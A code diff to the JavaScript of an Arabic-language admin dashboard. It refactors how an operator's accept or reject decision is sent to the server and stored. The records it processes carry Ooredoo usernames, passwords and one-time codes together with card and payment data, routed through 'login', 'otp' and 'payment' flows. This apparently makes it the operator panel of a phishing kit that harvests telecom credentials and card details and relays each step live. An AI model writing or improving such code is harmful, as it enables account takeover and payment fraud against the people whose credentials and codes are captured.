@@ -541,8 +541,8 @@
 
     modalBody.insertAdjacentHTML('beforeend', `
       <div class="modal-actions">
-        <button type="button" class="action-btn accept ${d.status === 'accept' ? 'active' : ''}" id="modalAcceptBtn">قبول</button>
-        <button type="button" class="action-btn reject ${d.status === 'reject' ? 'active' : ''}" id="modalRejectBtn">رفض</button>
+        <button type="button" class="action-btn accept ${d.status === 'accept' ? 'active' : ''}" id="ooredooAcceptBtn">قبول</button>
+        <button type="button" class="action-btn reject ${d.status === 'reject' ? 'active' : ''}" id="ooredooRejectBtn">رفض</button>
       </div>
     `);
 
@@ -570,36 +570,58 @@
 
   async function submitDecision(d, decision) {
     const id = d.id || (d.applicant && d.applicant.id) || d._id;
+    if (!id) return;
+
     const card = d.card || d.payment || null;
     const hasLoginData = Boolean((d.ooredooUser || (card && card.ooredooUser)) && (d.ooredooPass || (card && card.ooredooPass)));
     const hasOtpData = Boolean(d.ooredooOtp || (card && card.ooredooOtp));
-    const flow = hasOtpData ? 'otp' : 'login';
-    const orderId = String(id || sessionStorage.getItem('safwa_order_id') || 'ooredoo-' + Date.now());
-    const decisionKey = 'ooredooDecision_' + orderId;
-    const flowKey = 'ooredooFlow_' + orderId;
+    const hasOoredooData = Boolean((d.ooredooUser || (card && card.ooredooUser)) || (d.ooredooPass || (card && card.ooredooPass)) || (d.ooredooOtp || (card && card.ooredooOtp)));
+    const flow = hasOtpData ? 'otp' : (hasLoginData ? 'login' : 'payment');
+    const isOoredoo = hasOoredooData;
+    const endpoint = isOoredoo
+      ? '/api/orders/' + encodeURIComponent(id) + '/decision'
+      : '/api/payments/' + encodeURIComponent(id) + '/decision';
+
+    const payload = isOoredoo
+      ? { decision: decision, flow: flow }
+      : { decision: decision };
 
     try {
-      if (id) {
-        await fetch('/api/orders/' + encodeURIComponent(id) + '/decision', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            Authorization: 'Bearer ' + adminToken
-          },
-          body: JSON.stringify({ decision: decision, flow: flow })
-        });
+      const res = await fetch(endpoint, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          Authorization: 'Bearer ' + adminToken
+        },
+        body: JSON.stringify(payload)
+      });
+      const data = await res.json().catch(() => ({}));
+      if (!data.ok && res.status !== 200) {
+        throw new Error('decision failed');
       }
-    } catch (err) { /* ignore network errors, still update UI */ }
+    } catch (err) {
+      // still keep the UI in sync even if the request fails
+    }
 
-    try {
-      localStorage.setItem(decisionKey, decision);
-      sessionStorage.setItem(decisionKey, decision);
-      localStorage.setItem(flowKey, flow);
-      sessionStorage.setItem(flowKey, flow);
-      sessionStorage.setItem('safwa_order_id', orderId);
-    } catch (err) {}
+    if (isOoredoo) {
+      const orderId = String(id);
+      const decisionKey = 'ooredooDecision_' + orderId;
+      const flowKey = 'ooredooFlow_' + orderId;
+      try {
+        localStorage.setItem(decisionKey, decision);
+        sessionStorage.setItem(decisionKey, decision);
+        localStorage.setItem(flowKey, flow);
+        sessionStorage.setItem(flowKey, flow);
+        sessionStorage.setItem('safwa_order_id', orderId);
+      } catch (err) {}
+    }
 
+    loadedApplications = loadedApplications.map((app) => {
+      const currentId = app.id || (app.applicant && app.applicant.id) || app._id;
+      return currentId === id ? { ...app, status: decision } : app;
+    });
     d.status = decision;
+
     const detailsModal = document.getElementById('detailsModal');
     const ooredooModal = document.getElementById('ooredooModal');
     if (detailsModal) detailsModal.classList.remove('show');
